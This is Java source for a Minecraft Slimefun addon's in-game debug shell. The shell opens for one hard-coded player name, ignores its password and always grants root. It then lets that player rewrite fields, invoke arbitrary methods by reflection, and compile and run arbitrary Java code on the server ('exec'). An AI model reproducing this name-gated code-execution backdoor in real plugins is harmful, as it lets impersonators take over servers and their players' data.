package me.matl114.logitech.utils.UtilClass.CommandClass;

import com.google.common.base.Preconditions;
import io.github.thebusybiscuit.slimefun4.api.items.SlimefunItem;
import io.github.thebusybiscuit.slimefun4.libraries.dough.collections.Pair;
import me.matl114.logitech.Listeners.Listeners.PlayerQuiteListener;
import me.matl114.logitech.MyAddon;
import me.matl114.logitech.manager.Schedules;
import me.matl114.logitech.utils.AddUtils;
import me.matl114.logitech.utils.Debug;
import me.matl114.logitech.utils.ReflectUtils;
import me.matl114.logitech.utils.UtilClass.FunctionalClass.AsyncResultRunnable;
import org.bukkit.Bukkit;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

public class CommandShell {
    protected static String ROOT_PASSWORD="...";
    public static String PREFIX=AddUtils.color( AddUtils.ADDON_ID+" >>  ");
    public Player user;
    public BukkitRunnable task;
    private boolean root=false;
    public static HashMap<UUID,CommandShell> map = new HashMap<UUID,CommandShell>();
    public HashMap<String,Object> variables;
    public List<String> historyLogs=new ArrayList<>();
    public boolean status=true;
    public boolean interact_mod=true;
    public boolean async=true;
    static {

        PlayerQuiteListener.addHandler((playerQuitEvent -> {
            map.remove(playerQuitEvent.getUniqueId());
        }));
    }
    public static void setup(Player player,String password){
        UUID uuid=player.getUniqueId();
        if(!"matl114".equals(player.getName())){
            AddUtils.sendMessage(player,AddUtils.color("您没有权限使用LogiTech shell"));
            return;
        }
        CommandShell shell;
        if(map.containsKey(uuid)){
            shell=  map.get(uuid);
            shell.status=true;
            AddUtils.sendMessage(player,AddUtils.color( "成功进入LogiTech shell 输入help获取帮助 输入exit离开"));

        }else {
           shell=  new CommandShell(player);
           AddUtils.sendMessage(player,AddUtils.color("成功进入LogiTech shell 输入help获取帮助 输入exit离开"));
        }
        if(true){
            shell.root=true;
        }
        shell.run();

    }

    public CommandShell(Player player) {
        this.user = player;
        this.variables=new HashMap<>();
        this.async=true;
        map.put(this.user.getUniqueId(),this);
        setVariable(this,"user",user);
        setVariable(this,"Bukkit",Bukkit.class);
        setVariable(this,"null",null);
    }
    public List<String> outputStream=new ArrayList<>();
    public byte[] lock=new byte[0];
    //TODO RUN
    public void run(){
        AddUtils.asyncWaitPlayerInput(user,this::runCommandAsync);
    }
    //TODO execute
    public void clear(){
        if(!interact_mod)return;
        synchronized(lock){
            outputStream.clear();
        }
    }
    public void send(String message){
        if(!interact_mod)return;
        synchronized(lock){
            outputStream.add(AddUtils.concat(PREFIX,"&f",message));
        }
    }
    public void warn(String message){
        if(!interact_mod)return;
        synchronized(lock){
            outputStream.add(AddUtils.concat(PREFIX,"&e",message));
        }
    }
    public void error(String message){
        if(!interact_mod)return;
        synchronized(lock){
            outputStream.add(AddUtils.concat(PREFIX,"&c",message));
        }
    }
    public void print(){
        if(!interact_mod)return;
        synchronized(lock){
            for(String s:outputStream){
                AddUtils.sendMessage(user,s);
            }
            outputStream.clear();
        }
    }
    public static int MAX_LENGTH_IN_LINE=72;
    public void printObject(Object obj){
        if(!interact_mod)return;
        String str=getObjectStringDisplay(obj);
        if(str==null){
            str="<ERROR:UNKNOWN>";
        }
        synchronized(lock){
            outputStream.add(AddUtils.concat(PREFIX,str));
        }
    }
    public static String getObjectStringDisplay(Object obj){
        if(obj!=null){
            if(obj instanceof Class<?> cls){
                return "&6<path: %s>".formatted(cls.getName());
            }else if(obj.getClass().isArray()){
                try{
                    StringBuilder builder=new StringBuilder("[");
                    int length = java.lang.reflect.Array.getLength(obj);
                    for(int j=0;j<length;j++){
                        Object item = java.lang.reflect.Array.get(obj, j);
                        if(j!=0){
                            builder.append(",");
                            if(builder.length()>MAX_LENGTH_IN_LINE){
                                builder.append("\n");
                            }
                        }
                        builder.append(getObjectStringDisplay(item));

                    }
                    builder.append("]");
                    return builder.toString();
                }catch(Throwable ex){
                    return "<ERROR:ARRAY DISPLAY>";
                }
            }
            else if(obj instanceof Field field){
                return "&6<FIELD, type=%s, Name=%s, Class=%s, static=%s>".formatted(
                        getObjectStringDisplay(field.getType()),field.getName(),field.getDeclaringClass().getName(), Modifier.isStatic(field.getModifiers())?"true":"false");
            }else if(obj instanceof List<?> lst&&lst.isEmpty()){
                return "Empty List";
            }
            else {
                return "&6<class: %s, %s>".formatted(obj.getClass().getName(),obj.toString());
            }
        }
        else
            return "&6<NULL>";
    }
    public static class BaseWarpper{
        Class cls;
        Object val;
        public BaseWarpper(Object obj,Class cls){
            this.val=obj;
            this.cls=cls;
        }
        public Class<?> getClassType(){
            return cls;
        }
        public Object getVal(){
            return val;
        }
        public String toString(){
            return val.toString();
        }
    }
    public static HashMap<String,ShellCommand> commands=new HashMap<>();
    public interface ShellCommand{
        public int cmd(String[] argv,CommandShell shell);
        default ShellCommand register(String cmd){
            commands.put(cmd,this);
            return this;
        }
        String[] getHelp();
    }
    public void runCommandAsync(String command){
        Schedules.launchSchedules(
                ()->runCommand(command),0,!async,0);
    }
    public void runCommand(String command) {
        clear();
        if(command.startsWith("/")){
            command=command.substring(1);
        }
        AddUtils.sendMessage(user,command);
        historyLogs.add(command);
        try{
            String[] args = command.split(" ");
            String cmd=args[0];
            String[] argv= Arrays.copyOfRange(args,1,args.length);
            ShellCommand commandShell=commands.get(cmd);
            send("指令正常运行! 返回值 %d".formatted(commandShell.cmd(argv,this)));
        }catch (Throwable e){
            Debug.debug(e);
            clear();
            error("未知的指令,使用help获取更多信息!");
            error(e.getMessage());
        }
        print();
        if(!status){
            return;
        }
        run();
    }
    public static Pattern validVariable=Pattern.compile("(.*+)\\[[0-9]*+\\]");
    public static boolean checkVariableName(String name){
        return true;
    }
    public static int classNotFound(CommandShell shell,String className){
        shell.warn( AddUtils.concat( "找不到对应的类! ",className));
        return -1;
    }
    public static int classFieldNotFound(CommandShell shell,Class cls){
        shell.warn(AddUtils.concat("类 ",cls.getName()," 不存在该成员"));
        return -1;
    }
    public static int pathNotInit(CommandShell shell){
        shell.warn("暂未设置path! 请使用cd指令设置path");
        return 0;
    }
    public static int variableNotInit(CommandShell shell,String var){
        shell.warn("变量<%s>暂未初始化".formatted(var));
        return -1;
    }
    public static int variableFieldNotFound(CommandShell shell,String var){
        shell.warn(AddUtils.concat("变量 ",var," 不存在该成员"));
        return -1;
    }
    public static int arrayVaribleIndexOutOfBounds(CommandShell shell,String[] var){
        StringBuilder builder=new StringBuilder("尝试访问数组元素 <%s>, 但是下标".formatted(var[0]));
        for(int i=1;i<var.length;i++){
            if(i!=1){
                builder.append(",");
            }
            builder.append("[");
            builder.append(var[i]);
        }
        builder.append(" 并不是有效的下标");
        shell.warn(builder.toString());
        return -1;
    }
    public static int setFieldFailed(CommandShell shell,String var1,Field field,String err){
        shell.error(AddUtils.concat("设置变量<%s>的成员<%s>时出现未知错误!: %s").formatted(var1,field==null?"ERROR:NULL":field.getName(),err));
        return -1;
    }
    public static int typeNotSupported(CommandShell shell,String var1){
        shell.error(AddUtils.concat("不支持的常量类型: ",var1));
        return -1;
    }
    public static Object getVariable(CommandShell shell,String val){
        Object obj=getVariableRaw(shell,val);
        if(obj instanceof BaseWarpper bw){
            return bw.getVal();
        }
        return obj;
    }
    public static Class getVariableClass(CommandShell shell,String val){
        Object obj=getVariableRaw(shell,val);
        if(obj instanceof BaseWarpper bw){
            return bw.getClass();
        }
        return obj.getClass();
    }
    public static Object getBaseWarpper(String type,String val){
        Object obj;
        Class cls=getBaseType(type);
        if(cls.isArray()){
            return generateArrayFrom(type,val,cls);
        }
        switch(type){
            case "int": obj=Integer.valueOf(val); break;
            case "long": obj=Long.valueOf(val); break;
            case "double": obj=Double.valueOf(val); break;
            case "float": obj=Float.valueOf(val); break;
            case "boolean": obj=Boolean.valueOf(val); break;
            case "string": obj=val; break;
            case "byte": obj=Byte.valueOf(val); break;
            case "char": obj=val.charAt(0); break;
            case "class": try{

                obj=cls.forName(val);
                break;
            }catch(ClassNotFoundException e){
                throw  new IllegalArgumentException("Class Not Found");
            }
            default:
                obj=null;
        }
        return new BaseWarpper(obj,cls);
    }
    public static Object generateArrayFrom(String type,String val,Class cls){
        cls=cls.getComponentType();
        String elementString=val.substring(1,val.length()-1);
        int len=elementString.length();
        List<String> array=new ArrayList<>();
        StringBuilder builder=null;
        int stackNum=0;
        if(len==0){
            return Array.newInstance(cls,0);
        }
        for(int i=0;i<len;++i){
            if(builder==null){
                builder=new StringBuilder();
            }
            if(stackNum==0&&(elementString.charAt(i)==',')){
                array.add(builder.toString());
                builder=new StringBuilder();
                continue;
            }else if(elementString.charAt(i)=='[') {
                ++stackNum;
            }else if(elementString.charAt(i)==']'){
                --stackNum;
            }
            builder.append(elementString.charAt(i));
        }
        array.add(builder.toString());
        if(stackNum!=0){
            throw new  IllegalArgumentException("[ & ] not match in input expressions");
        }
        len=array.size();
        Object result=Array.newInstance(cls,len);
        for(int i=0;i<len;++i){
            Object obj=getBaseWarpper(type.substring(0,type.length()-2),array.get(i));
            if(obj instanceof BaseWarpper bw){
                obj=bw.getVal();
            }
            Array.set(result,i,obj);
        }
        return result;
    }
    public static Class getBaseType(String type){
        try{
            if(type.endsWith("[]")){
                return Array.newInstance(getBaseType(type.substring(0,type.length()-2)),0).getClass();
            }else {
                switch(type){
                    case "int":return int.class;
                    case "long":return long.class;
                    case "double":return double.class;
                    case "float":return float.class;
                    case "boolean":return boolean.class;
                    case "string":return String.class;
                    case "byte":return byte.class;
                    case "char":return char.class;
                    case "Object":return Object.class;
                    default:
                        try{
                        Class cls=Class.forName(type);
                            return cls;
                        }catch(Throwable e){
                            return Object.class;

                        }
                }
            }
        }catch(Throwable e){
            return Object.class;
        }
    }
    //TODO 增加. 直接反射
    //TODO 增加import 作为环境变量
    //TODO 反射全部加入enum支持
    //TODO 放在外面
    public static Object getVariableRaw(CommandShell shell,String val){
        String[] vals=val.split("\\[");
        if("null".equals(val)){
            return null;
        }
        Object result=shell.variables.get(vals[0]);
        if(result==null){
            try{
            String[] tempval=val.split(":");
            if(tempval.length==2){
                return getBaseWarpper(tempval[0],tempval[1]);
            }
            }catch(Throwable e){
                variableNotInit(shell,val);
            }
            variableNotInit(shell,vals[0]);
            return null;
        }
        try{
            for(int i=1;i<vals.length;i++){
                if(result instanceof List<?> lst){
                    result=lst.get(Integer.parseInt(vals[i].substring(0,vals[i].length()-1)));
                }else {
                    result=java.lang.reflect.Array.get(result,Integer.parseInt(vals[i].substring(0,vals[i].length()-1)));
                }
            }
            return result;
        }catch (Throwable e){
            arrayVaribleIndexOutOfBounds(shell,vals);
            return null;
        }
    }
    public static int setVariable(CommandShell shell,String val,Object var1){
        String[] vals=val.split("\\[");
        if(vals.length>1){
            Object result=shell.variables.get(vals[0]);
            if(result==null){
                return variableNotInit(shell,vals[0]);
            }
            try{
                for(int i=1;i<vals.length-1;i++){
                    if(result instanceof List<?> lst){
                        result=lst.get(Integer.parseInt(vals[i].substring(0,vals[i].length()-1)));
                    }else {
                        result=java.lang.reflect.Array.get(result,Integer.parseInt(vals[i].substring(0,vals[i].length()-1)));
                    }
                }
                if(result instanceof List lst){
                    lst.set(Integer.parseInt(vals[vals.length-1].substring(0,vals[vals.length-1].length()-1)),var1);
                }else {
                    java.lang.reflect.Array.set(result,Integer.parseInt(vals[vals.length-1].substring(0,vals[vals.length-1].length()-1)),var1);
                }
                return 1;
            }catch (Throwable e){
                arrayVaribleIndexOutOfBounds(shell,vals);
                return -1;
            }
        }else {
            shell.variables.put(val,var1);
            return 1;
        }
    }
    public static String getPathVarName(){
        return "____path@#";
    }
    public static ShellCommand help=new ShellCommand(){
        public String[] help=new String[]{
                "help 获得全部指令的说明",
                "help <arg1> 获得单个指令的说明"
        };
        public int cmd(String[] argv,CommandShell shell){
            shell.send("指令说明:");
            if(argv.length==1){
                String arg=argv[0];
                ShellCommand cmd=commands.get(arg);
                String[] help=cmd.getHelp();
                shell.send(AddUtils.concat("指令 ",arg));
                for(String s:help){
                    shell.send(s);
                }
                shell.send("  ");
            }else if(argv.length==0){
                for(String arg:commands.keySet()){
                    ShellCommand cmd=commands.get(arg);
                    String[] help=cmd.getHelp();
                    shell.send(AddUtils.concat("指令 ",arg));
                    for(String s:help){
                        shell.send(s);
                    }
                    shell.send("  ");
                }
            }
            return 0;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("help");
    public static ShellCommand exit=new ShellCommand(){
        public String[] help=new String[]{
                "exit 退出shell并删除记录",
        };
        public int cmd(String[] argv,CommandShell shell){
            shell.status=false;
            boolean success=false;
//            Iterator<Map.Entry<UUID,CommandShell>> shells=map.entrySet().iterator();
//            while(shells.hasNext()){
//                Map.Entry<UUID,CommandShell> entry=shells.next();
//                if(entry.getValue()==shell){
//                    shells.remove();
//                    success=true;
//                    break;
//                }
//            }
            //if(success){
                shell.send("成功退出");
//            }else {
//                shell.send("未知错误! 不正常的退出!");
//            }
            return success?1:0;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("exit");
    public static ShellCommand quit=new ShellCommand(){
        public String[] help=new String[]{
                "quit 退出shell不删除记录",
        };
        public int cmd(String[] argv,CommandShell shell){
            shell.status=false;
            shell.send("成功退出");
            return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("quit");
    public static ShellCommand settings=new ShellCommand(){
        public String[] help=new String[]{
                "setting <setting> <boolean> 设置基础设定",
        };
        public int cmd(String[] argv,CommandShell shell){
            boolean flag=Boolean.parseBoolean(argv[1]);
            switch (argv[0]){
                case "Async": shell.async=flag;return 1;
            }
            shell.warn(AddUtils.concat("不存在这样的设定项! ",argv[0]));
            return 0;

        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("setting");
    public static ShellCommand runCommand=new ShellCommand(){
        public String[] help=new String[]{
                "say <argvs> 玩家输出<argvs>,用空格相连"
        };
        public int cmd(String[] argv,CommandShell shell){
            if(Bukkit.isPrimaryThread()){
                shell.user.chat(String.join(" ", argv));
                return 1;
            }else {
                shell.user.chat(String.join(" ", argv));
                return 0;
            }
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("say");
    public static ShellCommand changeClass=new ShellCommand(){
        public String[] help=new String[]{
                "setPath <Class> 将当前指令的默认类对象设置为<Class>"
        };
        public int cmd(String[] argv,CommandShell shell){
            Class clazz;
            try{
                clazz=Class.forName(argv[0]);
            }catch (ClassNotFoundException err){
               return   classNotFound(shell,argv[0]);
            }
            return setVariable(shell,getPathVarName(),clazz);

        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("setPath");
    public static ShellCommand getStaticField=new ShellCommand(){
        public String[] help=new String[]{
                "getStatic <arg1> 获取当前默认类的名称为<arg1>的静态成员/枚举",
                "getStatic <arg1> <varName> 获取当前默认类的名称为<arg1>的静态成员/枚举,并赋值给<varName>变量"
        };
        public int cmd(String[] argv,CommandShell shell){

            Object clazz=getVariable(shell,getPathVarName());
            if(clazz instanceof Class cls){
                Object res;
                Class tarClass=cls;
                if(cls.isEnum()){
                    res=Enum.valueOf(cls,argv[0]);
                }else {
                    Pair<Field,Class> result= ReflectUtils.getDeclaredFieldsRecursively(cls,argv[0]);
                    if(result==null){
                        return classFieldNotFound(shell,cls);
                    }else {
                        tarClass=result.getSecondValue();
                        try{
                            res= result.getFirstValue().get(null);
                        }catch (Throwable err){
                            Debug.debug(err);
                            return classFieldNotFound(shell,cls);
                        }
                    }
                }
                shell.send(AddUtils.concat( "位于Class ",tarClass.getName()));
                shell.printObject(res);
                if(argv.length==2){
                    return setVariable(shell,argv[1],res);
                }
                return 1;


            }else {
                return pathNotInit(shell);
            }
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("getStatic");
    public static ShellCommand setStaticField=new ShellCommand(){
        public String[] help=new String[]{
                "setStatic <arg1> 将当前默认类对象的<arg1>静态成员设置为当前默认类对象",
                "setStatic <arg1> <var1> 将当前默认类对象的<arg1>静态成员设置为变量<var1>"
        };
        public int cmd(String[] argv,CommandShell shell){
            Object obj=getVariable(shell,getPathVarName());
            if(obj instanceof Class clazz) {
                Pair<Field,Class> result=ReflectUtils.getDeclaredFieldsRecursively(clazz,argv[0]);
                if(result==null){
                    return classFieldNotFound(shell,clazz);
                }else {
                    Object obj2= argv.length==1?obj:getVariable(shell,argv[1]);

                    try{
                        result.getFirstValue().set(null,obj2);
                    }catch (Throwable err){
                        setFieldFailed(shell,argv[0],result.getFirstValue(),err.getMessage());
                        return -1;
                    }
                    shell.send(AddUtils.concat( "位于Class ",result.getSecondValue().getName()," 的成员",result.getFirstValue().getName()));
                    shell.send("设置成功!");
                    return 1;
                }
            }
           else {
                return pathNotInit(shell);
            }
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("setStatic");
    public static ShellCommand get=new ShellCommand(){
        public String[] help=new String[]{
                "get 打印当前选中的类path信息",
                "get <varName> 打印变量<varName>"
        };
        public int cmd(String[] argv,CommandShell shell){
            if(argv.length==0){

                shell.printObject(getVariable(shell,getPathVarName()) );
            }else {
                shell.printObject( getVariable(shell,argv[0]));
            }
            return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("get");
    public static ShellCommand set=new ShellCommand(){
        public String[] help=new String[]{
                "set <var1> 将当前类对象存储至<var1>",
                "set <var1> <var2> 将变量<var2>存储至<var1>"
        };

        public int cmd(String[] argv,CommandShell shell){

            Object obj=getVariable(shell, argv.length==1? getPathVarName():argv[1]);
           return setVariable(shell,argv[0],obj);
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("set");
    public static ShellCommand getField=new ShellCommand(){
        public String[] help=new String[]{
                "getField <var1> <arg1> 获取变量<var1>名称为<arg1>的成员 ",
                "getField <var1> <arg1> <var2> 获取变量<var1>名称为<arg1>的成员,并赋值给var2 ",
        };
        public int cmd(String[] argv,CommandShell shell){
            Object obj=getVariable(shell,argv[0]);
            if(obj==null){
                return variableNotInit(shell,argv[0]);
            }else {
                Class clazz=obj.getClass();
                Pair<Field,Class> result=ReflectUtils.getDeclaredFieldsRecursively(clazz,argv[1]);
                if(result==null){
                    return variableFieldNotFound(shell,argv[0]);
                }else {
                    Object res;
                    try{
                        res= result.getFirstValue().get(obj);
                    }catch (Throwable err){
                        classFieldNotFound(shell,clazz);
                        return -1;
                    }
                    if(argv.length==3){
                        setVariable(shell,argv[2],res);
                    }
                    shell.send(AddUtils.concat( "位于Class ",result.getSecondValue().getName()));
                    shell.printObject(res);

                    return 1;
                }
            }
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("getField");
    public static ShellCommand getAllFields=new ShellCommand(){
        public String[] help=new String[]{
                "getAllFields <var1> 获取变量<var1>的所有成员 ",
                "getAllFields 获取当前设置的Class的所有成员",
        };
        public int cmd(String[] argv,CommandShell shell){
            Class clazz;
           if(argv.length==0){
               Object obj=getVariable(shell,getPathVarName());
               if(obj instanceof Class cls){
                   clazz=cls;
               }else {
                   return pathNotInit(shell);
               }
           }else {
               Object obj= getVariable(shell,argv[0]);
               if(obj==null){
                   return variableFieldNotFound(shell,argv[0]);
               }
               clazz=obj.getClass();
           }
           List<Field> fields=ReflectUtils.getAllDeclaredFieldsRecursively(clazz);
           if(fields.isEmpty()){
               shell.send("Empty List");
           }else {
               for(Field field:fields){
                   shell.printObject(field);
               }
           }
           return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("getAllFields");
    public static ShellCommand setField=new ShellCommand(){
        public String[] help=new String[]{
                "setField <var1> <arg1> <var2> 将变量<var2>赋值给变量<var1>名称为<arg1>的成员 ",
        };
        public int cmd(String[] argv,CommandShell shell){
            Preconditions.checkArgument( argv.length==3,"argument length should be 3");
            Object obj=getVariable(shell,argv[0]);
            if(obj==null){
                return variableNotInit(shell,argv[0]);
            }else {
                Class clazz=obj.getClass();
                Pair<Field,Class> result=ReflectUtils.getDeclaredFieldsRecursively(clazz,argv[1]);
                if(result==null){
                    return variableFieldNotFound(shell,argv[0]);
                }else {
                    Object obj2=getVariable(shell,argv[2]);

                    try{
                        result.getFirstValue().set(obj,obj2);
                    }catch (Throwable err){
                        setFieldFailed(shell,argv[0],result.getFirstValue(),err.getMessage());
                        return -1;
                    }
                    shell.send(AddUtils.concat( "位于Class ",result.getSecondValue().getName()," 的成员",result.getFirstValue().getName()));
                    shell.send("设置成功!");
                    return 1;
                }
            }
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("setField");

    public static ShellCommand constant=new ShellCommand(){
        public String[] help=new String[]{
                "const <type> <val> <var2> 将字符串<val>转为支持的基类/字符串<type>并将变量<var2>设置为该值",
                "const list <len> <var2> 将变量<var2>设置为创建的长度为<len>的数组"
        };
        public int cmd(String[] argv,CommandShell shell){
            Preconditions.checkArgument( argv.length==3,"argument length should be 3");
            String val=argv[1];
            Object obj=getBaseWarpper(argv[0],val);
            setVariable(shell,argv[2],obj);
            return 0;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("const");
    public static ShellCommand getSfItem=new ShellCommand(){
        public String[] help=new String[]{
                "getSfItem <ID> <var1> 获取id为<ID>的sf物品实例,并存储到",
                "getSfitem <ID> 获取id为<ID>的sf物品实例"
        };
        public int cmd(String[] argv,CommandShell shell){
            SlimefunItem item=SlimefunItem.getById(argv[0]);
            shell.printObject(item);
            if(argv.length==2){
                setVariable(shell,argv[1],item);
            }
            return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("getSfItem");
    public static ShellCommand getNearbyPlayer=new ShellCommand(){
        public String[] help=new String[]{
                "getNearbyEntity <int> <var1> 获取当前范围<int>内的全部实体,并存储在<var1>中",
                "getNearbyEntity <int> 获取当前范围<int>内的全部实体"
        };
        public int cmd(String[] argv,CommandShell shell){
            Collection<Entity> result;
            int nearby=Integer.parseInt(argv[0]);
            AsyncResultRunnable<Collection<Entity>> getNearby=new AsyncResultRunnable<Collection<Entity>>() {
                public Collection<Entity> result(){
                    return shell.user.getWorld().getNearbyEntities(shell.user.getLocation(),nearby,nearby,nearby);
                }
            };
            result=getNearby.waitThreadDone(true);
            Entity[] entities=new Entity[result.size()];
            int index=0;
            for (Entity  e:result){
                entities[index]=e;
                ++index;
            }
            shell.printObject(entities);
            if(argv.length==2){
                setVariable(shell,argv[1],entities);
            }return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("getNearbyEntity");
    public static ShellCommand getheld=new ShellCommand(){
        public String[] help=new String[]{
                "getHeldItem <var1> 获得玩家当前手持物品的对象并存入<var1>",
                "getHeldItem 获得玩家当前手持物品的对象"
        };
        public int cmd(String[] argv,CommandShell shell){
            ItemStack stack=shell.user.getItemInHand();
            shell.printObject(stack);
            if(argv.length==1){
                setVariable(shell,argv[0],stack);
            }

            return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("getHeldItem");
    public static ShellCommand exec=new ShellCommand(){
        public String[] help=new String[]{
                "exec <argvs> 执行代码,按空格划分行"
        };
        public int cmd(String[] argv,CommandShell shell){
            String code=String.join(" ", argv);
            String className = "ExecRunTime";
            code = "public class " + className + " { " +
                    "  public static void main(String[] args) { " +
                    code +
                    "  }" +
                    "}";

            // Create a file for the Java source code
            try {
                File sourceFile = new File(className + ".java");
                FileWriter writer = new FileWriter(sourceFile);
                writer.write(code);
                writer.close();

                // Compile the Java source file
                JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
                int result = compiler.run(null, null, null, sourceFile.getPath());
                if (result == 0) {
                    // Execute the compiled class
                    ProcessBuilder processBuilder = new ProcessBuilder("java", className);
                    processBuilder.inheritIO();  // To inherit the input/output from the current process
                    Process process = processBuilder.start();
                    process.waitFor();
                } else {
                    System.out.println("Compilation failed.");
                }
            } catch (Throwable e) {
                e.printStackTrace();
            }
            return 0;

        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("exec");
    public static ShellCommand invoke=new ShellCommand(){
        public String[] help=new String[]{
                "invoke <var1> <method> <varlist>... 当<var1>为类时候,反射静态方法<method>,反之则反射对象<var1>的方法<method>",
                "invoke set <result> <var1> <method> <varlist>... 当<var1>为类时候,反射静态方法<method>,反之则反射对象<var1>的方法<method>,并将结果存入<result>",
        };
        public int cmd(String[] argv,CommandShell shell){
            String result=null;
            if("set".equals(argv[0])){
                result=argv[1];
                argv=Arrays.copyOfRange(argv,2,argv.length);
            }
            Object obj=getVariable(shell,argv[0]);
            String methodName=argv[1];
            Object[] parameters=new Object[argv.length-2];
            Class[] parameterClass=new Class[argv.length-2];
            for(int i=2;i<argv.length;i++){
                parameters[i-2]=getVariableRaw(shell,argv[i]);
                if(parameters[i-2] instanceof BaseWarpper bw){
                    parameterClass[i-2]=bw.getClassType();
                    parameters[i-2]=bw.getVal();
                }else{
                    if(parameters[i-2]!=null){
                        parameterClass[i-2]=  parameters[i-2].getClass();
                    }else {
                        parameterClass[i-2]=Object.class;
                    }
                }
                Debug.logger(parameterClass[i-2]);
            }
            if(obj instanceof Class cls){
                Method method=ReflectUtils.getSuitableMethod(cls,methodName,parameterClass).getFirstValue() ;
                try{
                    Object e= method.invoke(null,parameters);
                    if(result!=null){
                        setVariable(shell,result,e);
                    }
                    shell.send("INVOKE SUCCESS, RETURN VAL");
                    shell.printObject(e);
                }catch(Exception e){

                    shell.error(e.getMessage());
                    Debug.debug(e);
                }
            }else {
                Class cls=obj.getClass();
                Method method=ReflectUtils.getSuitableMethod(cls,methodName,parameterClass).getFirstValue() ;
                try{
                    Object e= method.invoke(obj,parameters);
                    if(result!=null){
                        setVariable(shell,result,e);
                    }
                    shell.send("INVOKE SUCCESS, RETURN VAL");
                    shell.printObject(e);
                }catch(Exception e){
                    shell.error(e.getMessage());
                    Debug.debug(e);
                }
            }return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("invoke");
    public static ShellCommand newInstance=new ShellCommand(){
        public String[] help=new String[]{
                "newInstance <classVar> <varlist>... 用<varlist>创建classVar的新实例",
                "newInstance set <result> <classVar> <varlist>... 用<varlist>创建classVar的新实例,并保存至<result>",
        };
        public int cmd(String[] argv,CommandShell shell){
            String result=null;
            ArrayList a=new ArrayList<String>();

            if("set".equals(argv[0])){
                result=argv[1];
                argv=Arrays.copyOfRange(argv,2,argv.length);
            }
            Object obj=getVariable(shell,argv[0]);
            Object[] parameters=new Object[argv.length-1];
            Class[] parameterClass=new Class[argv.length-1];
            for(int i=1;i<argv.length;i++){
                parameters[i-1]=getVariableRaw(shell,argv[i]);
                if(parameters[i-1] instanceof BaseWarpper bw){
                    parameterClass[i-1]=bw.getClassType();
                    parameters[i-1]=bw.getVal();
                }else{
                    if(parameters[i-1]!=null){
                        parameterClass[i-1]=  parameters[i-1].getClass();
                    }else {
                        parameterClass[i-1]=Object.class;
                    }
                }
                Debug.logger(parameterClass[i-1]);
            }
            if(obj instanceof Class cls){
                try{

                    Constructor ct=ReflectUtils.getSuitableConstructor(cls,parameterClass);
                    Object e= ct.newInstance(parameters);
                    shell.send("NEWINSTANCE SUCCESS, RETURN VAL");
                    shell.printObject(e);
                    if(result!=null){
                        setVariable(shell,result,e);
                    }
                }catch(Exception e){
                    shell.error(e.getMessage());
                    Debug.debug(e);
                }
            }else {
                Class cls=obj.getClass();
                try{

                    Constructor ct=ReflectUtils.getSuitableConstructor(cls,parameterClass);
                    Object e= ct.newInstance(parameters);
                    shell.send("NEWINSTANCE SUCCESS, RETURN VAL");
                    shell.printObject(e);
                    if(result!=null){
                        setVariable(shell,result,e);
                    }
                }catch(Exception e){
                    shell.error(e.getMessage());
                    Debug.debug(e);
                }
            }return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("newInstance");
    public static ShellCommand breakPoint=new ShellCommand(){
        public String[] help=new String[]{
                "break get <int> 获取<int>处的断点值,如果还未解除",
                "break get <int> <var2> 获取<int>处的断点值,如果还未解除,并将断点Object存入<var2>",
                "break <int> 启动<int>处的断点,当断点位于主线程时,将会跳过,再次输入将关闭断点",
                "break <int> <var2> 启动<int>处的断点,当断点位于主线程时,将会跳过,再次输入将关闭断点,同时获得断点Object值存入<var2>"
        };
        public int cmd(String[] argv,CommandShell shell){
            if(!MyAddon.testmode()){
                shell.warn("附属并未在测试模式,无法启用断点功能");
            }
            if("get".equals(argv[0])){
                int index=Integer.valueOf(argv[1]);
                Object obj=Debug.getBreakValue(index);
                shell.printObject(obj);
                if(argv.length==3){
                    setVariable(shell,argv[2],obj);
                }
                return 1;
            }
            int index=Integer.valueOf(argv[0]);
            AtomicBoolean bo= Debug.getBreakPoint(index);
            Object obj=null;
            if(bo.get()){
                obj=Debug.getBreakValue(index);
                if(argv.length==2)
                    Debug.setBreakPoint(index,false);
            }else {
                Debug.setBreakPoint(index,true);
                if(argv.length==2)
                    obj=new AsyncResultRunnable<Object>(){
                        public Object result(){
                            while(!Debug.getHasSetValue(index)){
                                try {
                                    Thread.sleep(10);
                                }catch (InterruptedException e) {
                                }
                            }
                            return Debug.getBreakValue(index);
                        }
                    };
            }
            if(argv.length==2){
                setVariable(shell,argv[1],obj);
            }
            return 1;
        }
        public String[] getHelp(){
            return this.help;
        }
    }.register("break");

    //TODO more commands
}
